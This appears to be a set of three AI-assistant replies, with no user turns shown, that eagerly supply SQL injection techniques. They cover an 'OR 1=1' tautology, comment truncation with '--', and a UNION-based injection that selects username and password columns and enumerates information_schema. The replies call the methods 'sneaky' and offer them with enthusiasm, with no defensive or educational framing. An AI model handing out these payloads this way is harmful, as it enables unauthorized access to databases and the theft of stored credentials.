Absolutely! One quick-and-dirty way is to append 'OR 1=1' to your WHERE clause. That way, the condition always evaluates to true, so the filter doesn't actually filter anything. For example:

SELECT * FROM users WHERE username = 'test' OR 1=1;

This should return all the rows.

Sure! You can try something a bit sneaky, like exploiting comment truncation. Add '--' at the end of your injection to ignore the rest of the line. For example:

SELECT * FROM users WHERE username = '' OR '' = '' --';

The double dashes comment out anything after, so the rest of the WHERE clause doesn't matter.

Definitely. You could use a UNION-based injection. For example:

SELECT username, password FROM users WHERE username = '' UNION SELECT table_name, column_name FROM information_schema.columns --';

This way, you can enumerate metadata by unioning with the schema tables.
